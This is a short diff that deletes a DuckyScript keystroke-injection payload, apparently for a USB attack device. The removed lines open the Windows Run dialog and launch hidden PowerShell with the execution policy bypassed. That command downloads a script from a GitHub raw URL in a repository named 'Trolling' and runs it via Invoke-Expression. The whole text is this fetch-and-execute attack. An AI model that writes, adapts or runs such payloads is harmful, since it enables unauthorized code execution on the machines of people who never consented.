@@ -1,7 +1,0 @@
-REM
-REM
-GUI r
-DELAY 1000
-STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lukaspalm/Trolling/main/Pride_Wallpaper') | Invoke-Expression"
-DELAY 300
-ENTER
